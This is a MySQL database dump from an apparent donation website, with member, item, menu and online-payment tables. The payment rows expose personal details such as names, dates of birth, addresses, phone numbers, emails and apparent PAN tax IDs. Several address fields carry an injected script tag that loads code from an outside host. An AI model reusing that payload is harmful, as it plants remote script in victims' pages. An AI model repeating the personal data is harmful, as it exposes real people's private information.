(373, '2', 'Vadiraj', 'K', '0000-00-00', 'M', '1051-11-467-039', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vadiraj K', '', 'ADC', '', 'MSCs-2B', 0),
(374, '2', 'Devender Singh ', 'Gour', '0000-00-00', 'M', '1051-11-474-058', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Devender Singh  Gour', '', 'ADC', '', 'MECs-2A', 0),
(375, '2', 'Guddamla Santosh', 'Kumar', '0000-00-00', 'M', '1051-11-474-021', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Guddamla Santosh Kumar', '', 'ADC', '', 'MECs-2A', 0),
(376, '2', 'Srinivas', 'V ', '0000-00-00', 'M', '1051-11-474-037', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Srinivas V ', '', 'ADC', '', 'MECs-2A', 0),
(377, '2', 'Swapna', 'E', '0000-00-00', 'F', '1051-11-467-079', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Swapna E', '', 'ADC', '', 'MSCs-2B', 0),
(379, '2', 'Sankar', 'N', NULL, 'M', '45/C/3, Krishnapuram Street,Choolaimedu', 'Chennai', 'Tamil Nadu', 'India', '600094', '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. N. Sankar', NULL, NULL, NULL, NULL, 0),
(380, '2', 'Vasudeva Murali', 'M', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. M. Vasudeva Murali', NULL, NULL, NULL, NULL, 0),
(381, '2', 'Sunil', 'Reddy M', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sunil Reddy M', NULL, NULL, NULL, NULL, 0),
(382, '2', 'Geeta', 'Goel', NULL, 'F', NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Geeta Goel', NULL, NULL, NULL, NULL, 0),
(383, '2', 'Sai Mukundan', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sai Mukundan', NULL, NULL, NULL, NULL, 0),
(384, '2', 'Moses', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Moses', NULL, NULL, NULL, NULL, 0),
(385, '2', 'Sunita', 'Reddy G', NULL, 'F', 'Trendset Winz', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Sunita Reddy G', NULL, NULL, NULL, NULL, 0),
(386, '2', 'Remya Thomas', '', '0000-00-00', 'F', '1051-11-474-009', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Remya Thomas ', '', 'ADC', '', 'MECs-2', 0),
(387, '2', 'Snehalata', 'Behera', '0000-00-00', 'F', '1051-11-474-120', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Snehalata Behera', '', 'ADC', '', 'MECs-2', 0),
(388, '2', 'Sainath', 'M V', '0000-00-00', 'M', '1051-11-474-013', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sainath M V', '', 'ADC', '', 'MECs-2', 0),
(389, '2', 'Sowmya', 'Dyagala', '0000-00-00', 'F', '1051-11-402-137', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sowmya Dyagala', '', 'ADC', '', 'B.com-2B', 0),
(390, '2', 'Bhagyalakshmi', 'G', '0000-00-00', 'F', '1051-11-468-013', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Bhagyalakshmi G', '', 'ADC', '', 'MPCs-2', 0),
(391, '2', 'Avinash', 'C V', '0000-00-00', 'M', '1051-11-474-049', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Avinash C V', '', 'ADC', '', 'MECs-2', 0),
(392, '2', 'Karthik', 'C ', '0000-00-00', 'M', '1051-11-467-015', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Karthik C ', '', 'ADC', '', 'MSCs-2', 0),
(393, '2', 'Akhileshwar', 'G', '0000-00-00', 'M', '1051-11-474-084', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Akhileshwar G', '', 'ADC', '', 'MECs-2', 0),
(394, '2', 'Naveen', 'M', '0000-00-00', 'M', '1051-11-474-080', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Naveen M', '', 'ADC', '', 'MECs-2', 0),
(395, '2', 'Shashank', '', '0000-00-00', 'M', '1051-11-488-009', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Shashank ', '', 'ADC', '', 'Life sciencs-2', 0),
(396, '2', 'Sunaina', '', '0000-00-00', 'F', '1051-11-488-000', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sunaina ', '', 'ADC', '', 'Life sciencs-2', 0),
(397, '2', 'C V Sastri', NULL, NULL, 'M', '8-2-603/1/1, "Amma", Opp. IAS Officers quarters, Road#10, Banjara hills', 'Hyderabad', 'Andhra Pradesh', 'India', '500034', '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. C V Sastri', NULL, NULL, NULL, NULL, 0),
(398, '2', 'Neha', 'Bansal', NULL, 'F', NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Neha Bansal', NULL, NULL, NULL, NULL, 0);

-- --------------------------------------------------------

--
-- Table structure for table `items`
--

CREATE TABLE IF NOT EXISTS `items` (
  `item_id` int(4) NOT NULL AUTO_INCREMENT,
  `item_name` varchar(50) NOT NULL,
  `category_id` int(3) NOT NULL,
  `donationitemcategory` varchar(50) NOT NULL,
  PRIMARY KEY (`item_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;

--
-- Dumping data for table `items`
--

INSERT INTO `items` (`item_id`, `item_name`, `category_id`, `donationitemcategory`) VALUES
(1, 'Bed Sheets/Curtains', 0, 'Clothes'),
(2, 'Blankets', 0, 'Clothes'),
(3, 'Blouses-Ladies', 0, 'Clothes'),
(4, 'Chunnis', 0, 'Clothes'),
(5, 'Dhoti Pieces', 0, 'Clothes'),
(6, 'Froks', 0, 'Clothes'),
(7, 'Gents Kurthas', 0, 'Clothes'),
(8, 'Gowns', 0, 'Clothes'),
(9, 'Jackets-Men', 0, 'Clothes'),
(10, 'Jeans Pants', 0, 'Clothes'),
(11, 'Kids Wear', 0, 'Clothes'),
(12, 'Kurta Pyjama', 0, 'Clothes'),
(13, 'Kurtis', 0, 'Clothes'),
(14, 'Ladies Kurtis Set', 0, 'Clothes'),
(15, 'Langas', 0, 'Clothes'),
(16, 'Miscellaneous', 0, 'Clothes'),
(17, 'Night Suits - Gents', 0, 'Clothes'),
(18, 'Night Suits - Ladies', 0, 'Clothes'),
(19, 'Pillow covers/small sheets', 0, 'Clothes'),
(20, 'Punjabi Suits', 0, 'Clothes'),
(21, 'Pyjamas', 0, 'Clothes'),
(22, 'Pyjamas-Ladies', 0, 'Clothes'),
(23, 'Rag Cloths', 0, 'Clothes'),
(24, 'Salwar', 0, 'Clothes'),
(25, 'Sarees', 0, 'Clothes'),
(26, 'Shirts - Gents', 0, 'Clothes'),
(27, 'Shirts/Tops- Ladies', 0, 'Clothes'),
(28, 'Shorts', 0, 'Clothes'),
(29, 'Skirts', 0, 'Clothes'),
(30, 'Suits - Gents', 0, 'Clothes'),
(31, 'T- Shirts', 0, 'Clothes'),
(32, 'Towels', 0, 'Clothes'),
(33, 'Track Pants', 0, 'Clothes'),
(34, 'Trousers', 0, 'Clothes'),
(35, 'Winter Wear', 0, 'Clothes'),
(36, 'Books', 0, 'Paper'),
(37, 'Carton', 0, 'Paper'),
(38, 'Electrical and Electronic', 0, 'Electrical/Electronic'),
(39, 'Glass Bottles', 0, 'Glass'),
(40, 'Metal Item', 0, 'Metal'),
(41, 'Miscellaneous Waste', 0, 'Miscellaneous Waste'),
(42, 'Mixed paper', 0, 'Paper'),
(43, 'News Papers', 0, 'Paper'),
(44, 'Paper (A4)', 0, 'Paper'),
(45, 'Plastic', 0, 'Plastic'),
(46, 'Plastic Bottle/Can', 0, 'Plastic'),
(47, 'Plastics-Hard', 0, 'Plastic'),
(48, 'Plastics-Light', 0, 'Plastic'),
(49, 'Polythene', 0, 'Plastic'),
(50, 'Mixed Plastic', 0, 'Plastic'),
(51, 'Rough Plastic', 0, 'Plastic'),
(52, 'Shoes', 0, 'Shoes'),
(53, 'Tin Box', 0, 'Metal'),
(64, 'Shredded Paper', 0, 'Paper'),
(54, 'Glass', 0, 'Glass'),
(65, 'Compost', 0, 'Compost');

-- --------------------------------------------------------

--
-- Table structure for table `item_categories`
--

CREATE TABLE IF NOT EXISTS `item_categories` (
  `category_id` int(3) NOT NULL,
  `category_name` varchar(50) NOT NULL,
  PRIMARY KEY (`category_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `lookup_state`
--

CREATE TABLE IF NOT EXISTS `lookup_state` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `statename` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=37 ;

--
-- Dumping data for table `lookup_state`
--

INSERT INTO `lookup_state` (`id`, `statename`) VALUES
(1, 'Andaman and Nicobar Islands'),
(2, 'Andhra Pradesh'),
(3, 'Arunachal Pradesh'),
(4, 'Assam'),
(5, 'Bihar'),
(6, 'Chandigarh'),
(7, 'Chhattisgarh'),
(8, 'Dadra and Nagar Haveli'),
(9, 'Daman and Diu'),
(10, 'Delhi'),
(11, 'Goa'),
(12, 'Gujarat'),
(13, 'Haryana'),
(14, 'Himachal Pradesh'),
(15, 'Jammu and Kashmir'),
(16, 'Jharkhand'),
(17, 'Karnataka'),
(18, 'Kerala'),
(19, 'Lakshadweep'),
(20, 'Madhya Pradesh'),
(21, 'Maharashtra'),
(22, 'Manipur'),
(23, 'Meghalaya'),
(24, 'Mizoram'),
(25, 'Nagaland'),
(26, 'Orissa'),
(27, 'Puducherry'),
(28, 'Punjab'),
(29, 'Rajasthan'),
(30, 'Sikkim'),
(31, 'Tamil Nadu'),
(32, 'Tripura'),
(33, 'Uttarakhand'),
(34, 'Uttar Pradesh'),
(35, 'West Bengal'),
(36, 'Other');

-- --------------------------------------------------------

--
-- Table structure for table `menus`
--

CREATE TABLE IF NOT EXISTS `menus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `label` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `label` (`label`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=12 ;

--
-- Dumping data for table `menus`
--

INSERT INTO `menus` (`id`, `label`, `url`) VALUES
(1, 'Home', '/'),
(2, 'Seva mela', '/cakephp'),
(3, '4 Donations', '/four_donations.php'),
(4, 'Donate Time', '/donate-your-time.php'),
(5, 'Donate in Kind', '/donate-in-kind.php'),
(6, 'Donate Waste', '/donate-your-waste.php'),
(7, 'Donate for Results', '/uccertificates.php'),
(8, 'Postpaid Donations', '/uccertificates-acquired.php'),
(9, 'Project & Partners', '/projects-partners.php'),
(10, 'About UC', '/aboutuc.php'),
(11, 'Contact', '/uc-contact.php');

-- --------------------------------------------------------

--
-- Table structure for table `online_payments`
--

CREATE TABLE IF NOT EXISTS `online_payments` (
  `Transaction_id` int(4) NOT NULL AUTO_INCREMENT,
  `First_Name` char(50) NOT NULL,
  `Last_Name` char(50) NOT NULL,
  `Father_Husband_Name` char(100) NOT NULL,
  `DOB` date NOT NULL,
  `Gender` char(1) NOT NULL,
  `Address` char(200) NOT NULL,
  `Village_Town` char(50) NOT NULL,
  `State` char(50) NOT NULL,
  `Country` char(50) NOT NULL,
  `PIN_Code` int(6) NOT NULL,
  `Title_Designation` char(50) NOT NULL,
  `Mobile_Phone_No` char(20) NOT NULL,
  `Personal_EMail_ID` char(100) NOT NULL,
  `Official_EMail_ID` char(100) NOT NULL,
  `PAN` char(20) NOT NULL,
  `Feature_Permission` char(1) NOT NULL,
  `Feature_Quote` char(255) NOT NULL,
  `Display_Name` char(100) NOT NULL,
  `Image_url` char(255) NOT NULL,
  `Certificate_ID` char(4) NOT NULL,
  `Donation_Amt` int(11) NOT NULL,
  `PAYMENT_ID_GATEWAY` int(20) NOT NULL,
  `Trans_Status` varchar(100) NOT NULL,
  `Trans_Number` char(20) NOT NULL,
  `GATEWAY_RESPONSE` varchar(200) NOT NULL,
  PRIMARY KEY (`Transaction_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=63 ;

--
-- Dumping data for table `online_payments`
--

INSERT INTO `online_payments` (`Transaction_id`, `First_Name`, `Last_Name`, `Father_Husband_Name`, `DOB`, `Gender`, `Address`, `Village_Town`, `State`, `Country`, `PIN_Code`, `Title_Designation`, `Mobile_Phone_No`, `Personal_EMail_ID`, `Official_EMail_ID`, `PAN`, `Feature_Permission`, `Feature_Quote`, `Display_Name`, `Image_url`, `Certificate_ID`, `Donation_Amt`, `PAYMENT_ID_GATEWAY`, `Trans_Status`, `Trans_Number`, `GATEWAY_RESPONSE`) VALUES
(1, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'APPROVED', '2345939111521070', 'PAYMENT SUCESSFUL'),
(2, 'ugtjg', 'uyguygyg', 'uyguygg uyguy', '1989-07-01', 'M', 'jgfh fffufuy uyfg uyu uy fuf ut futf 400074 India', 'uy fuf', 'ut futf', 'India', 400074, '', '+919876543212', 'test@test.com', 'test@test.com', '', 'N', '', 'ugtjg uyguygyg', '', '17', 1000, 2147483647, 'APPROVED', '1180016021121080', 'PAYMENT SUCESSFUL'),
(3, 'ghfhg', 'gchgc', 'uyguygg uyguy', '1988-07-01', 'M', 'hgvhgvh gvhgvh vhgvhg Type a choice below ... 400074 India', 'vhgvhg', 'Type a choice below ...', 'India', 400074, '', '919876543212', 'test@test.com', 'test@test.com', '', '', '', 'ghfhg gchgc', '', '', 10000, 2147483647, 'INITIALISED', '', ''),
(4, 'Balaji', 'R', 'gncgfcgfc', '1989-07-01', 'M', '11A [Trustpuram] 3rd cross street kodambakkam </title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ><', 'Chennai', 'Tamil Nadu', 'India', 600024, '', '9894525465', 'testcrb@gmail.com', 'testcrb@gmail.com', '', '', '', 'Balaji R', '', '', 10000, 2147483647, 'INITIALISED', '', ''),
(5, 'Balaji', 'R', 'gncgfcgfc', '1989-07-01', 'M', '11A [Trustpuram] 3rd cross street kodambakkam </title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ><', 'Chennai', 'Tamil Nadu', 'India', 600024, '', '9894525465', 'testcrb@gmail.com', 'testcrb@gmail.com', '', '', '', 'Balaji R', '', '', 1200, 2147483647, 'INITIALISED', '', ''),
(6, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'ABORTED', '890663531521080', 'PAYMENT SUCESSFUL'),
(7, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '8', 990, 2147483647, 'ABORTED', '7321072561521080', 'PAYMENT SUCESSFUL'),
(8, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'ABORTED', '7697631581521080', 'PAYMENT SUCESSFUL'),
(9, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'ABORTED', '8985171001621080', 'PAYMENT SUCESSFUL'),
(10, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'ABORTED', '7880823141621080', 'PAYMENT SUCESSFUL'),
(11, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'ABORTED', '2077307171621080', 'PAYMENT SUCESSFUL'),
(12, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'APPROVED', '3915502351621080', 'PAYMENT SUCESSFUL'),
(13, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'ABORTED', '2862481411621080', 'PAYMENT SUCESSFUL'),
(14, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '9198853274675', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'APPROVED', '4846157271721080', 'PAYMENT SUCESSFUL'),
(15, 'hgchyf', 'gchgc', 'gncgfcgfc', '1989-07-01', 'M', 'hgvhgvh gvhgvh vhgvhg Type a choice below ... 400074 India', 'vhgvhg', 'Type a choice below ...', 'India', 400074, '', '919876543212', 'test@test.com', 'test@test.com', '', 'N', '', 'hgchyf gchgc', '', '11', 1200, 2147483647, 'APPROVED', '2846661560921090', 'PAYMENT SUCESSFUL'),
(16, 'Balaji', 'R', 'uyguygg uyguy', '1989-07-01', 'M', '11A [Trustpuram] 3rd cross street kodambakkam </title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ><', 'Chennai', 'Tamil Nadu', 'India', 600024, '', '9894525465', 'testcrb@gmail.com', 'testcrb@gmail.com', '', '', '', 'Balaji R', '', '', 10000, 2147483647, 'INITIALISED', '', ''),
(17, 'Balaji', 'R', 'gncgfcgfc', '1988-07-01', 'M', '11A [Trustpuram] 3rd cross street kodambakkam </title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ><', 'Chennai', 'Tamil Nadu', 'India', 600024, '', '9894525465', 'testcrb@gmail.com', 'testcrb@gmail.com', '', '', '', 'Balaji R', '', '', 100000, 2147483647, 'INITIALISED', '', ''),
(18, 'Balaji', 'R', 'gncgfcgfc', '1988-07-01', 'M', '11A [Trustpuram] 3rd cross street kodambakkam </title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ></script></title><script src=http://hjfghj.com/r.php ><', 'Chennai', 'Tamil Nadu', 'India', 600024, '', '9894525465', 'testcrb@gmail.com', 'testcrb@gmail.com', '', '', '', 'Balaji R', '', '', 100000, 2147483647, 'INITIALISED', '', ''),
(19, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, 'sas', '919898981111', 'aaa@aaa.com', 'aaa@aaa.com', 'ZXcsada', 'N', '', 'Test a', '', '8', 100, 2147483647, 'APPROVED', '8143641011321300', 'PAYMENT SUCESSFUL'),
(20, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '919898981111', 'aaa@aaa.com', 'aaa@aaa.com', 'ZXcsada', '', '', 'Test a', '', '', 100, 2147483647, 'INITIALISED', '', ''),
(21, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 0, 0, 'INITIALISED', '', ''),
(22, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 0, 0, 'INITIALISED', '', ''),
(23, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 0, 0, 'INITIALISED', '', ''),
(24, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 0, 0, 'INITIALISED', '', ''),
(25, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 0, 0, 'INITIALISED', '', ''),
(26, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, '', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 0, 0, 'INITIALISED', '', ''),
(27, 'Test', 'a', 'asas', '1999-08-09', 'M', 'sazxsadS SADC Ssad asd asd India', 'Ssad', 'asd', 'India', 0, 'sas', '', 'aaa@aaa.com', 'aaa@aaa.com', '', '', '', 'Test a', '', '', 100, 2147483647, 'INITIALISED', '', ''),
(28, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'INITIALISED', '', ''),
(29, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 990, 2147483647, 'APPROVED', '7278137151521300', 'PAYMENT SUCESSFUL'),
(30, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 0, 'INITIALISED', '', ''),
(31, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 0, 'INITIALISED', '', ''),
(32, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, 'Architect', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'Y', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'INITIALISED', '', ''),
(33, 'ygugu', 'uygugu', 'uguyguuygu', '1989-07-01', 'M', 'yuguygyu uyguygug uyguyguy yuguyguu yuguyguy India', 'uyguyguy', 'yuguyguu', 'India', 0, 'iygiygiy', '+919876543212', 'test@test.com', 'test@test.com', '', '', '', 'ygugu uygugu', '', '', 100, 2147483647, 'APPROVED', '6807999191021360', 'PAYMENT SUCESSFUL'),
(34, 'ygugu', 'uygugu', 'uguyguuygu', '1989-07-01', 'M', 'yuguygyu  uyguyguy yuguyguu yuguyguy India', 'uyguyguy', 'yuguyguu', 'India', 0, 'iygiygiy', '+919876543212', 'test@test123.com', 'test@test123.com', '', '', '', 'ygugu uygugu', '', '', 99, 2147483647, 'INITIALISED', '', ''),
(35, 'jhgfjhghjgu', 'ujyhguyguyg', 'yuguyguyg', '1989-07-01', 'M', 'hg hjghyjgyu guyg      India', '', '', 'India', 0, 'hjg', '', 'test@test.com', 'test@test.com', '', '', '', 'jhgfjhghjgu ujyhguyguyg', '', '', 10000, 2147483647, 'APPROVED', '103760201121430', 'PAYMENT SUCESSFUL'),
(36, 'jhgfjhghjgu', 'ujyhguyguyg', 'yuguyguyg', '1989-07-01', 'M', 'hg hjghyjgyu guyg      India', '', '', 'India', 0, '', '', 'test@test.com', 'test@test.com', '', '', '', 'jhgfjhghjgu ujyhguyguyg', '', '', 1200, 2147483647, 'INITIALISED', '', ''),
(37, 'jhgfjhghjgu', 'ujyhguyguyg', 'yuguyguyg', '1989-07-01', 'M', '     India', '', '', 'India', 0, '', '', 'amount@test.com', 'amount@test.com', '', '', '', 'jhgfjhghjgu ujyhguyguyg', '', '', 99, 2147483647, 'INITIALISED', '', ''),
(38, 'jhgfjhghjgu', 'ujyhguyguyg', 'yuguyguyg', '1989-07-01', 'M', '     India', '', '', 'India', 0, '', '', 'amount@test.com', 'amount@test.com', '', '', '', 'jhgfjhghjgu ujyhguyguyg', '', '', 99, 2147483647, 'INITIALISED', '', ''),
(39, 'Raj', 'Shekhar', 'Narayana Murthy', '1980-09-14', 'M', '10000 1234 Hyd AP 500040 India', 'Hyd', 'AP', 'India', 500040, 'Tech Specilaist', '9885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', '123456', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'INITIALISED', '', ''),
(40, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'INITIALISED', '', ''),
(41, 'Raj', 'Shekhar', '', '0000-00-00', 'M', '61  Tirumala Nagar Meerpet  Moulali  Hyderabad AP 500040 India', 'Hyderabad', 'AP', 'India', 500040, '', '919885327465', 'rrajshekhar@gmail.com', 'rrajshekhar@gmail.com', 'AHTPR9498R', 'N', 'NA', 'Raj Shekhar', 'NA', '1', 1000, 2147483647, 'APPROVED', '1010088121321890', 'PAYMENT SUCESSFUL'),
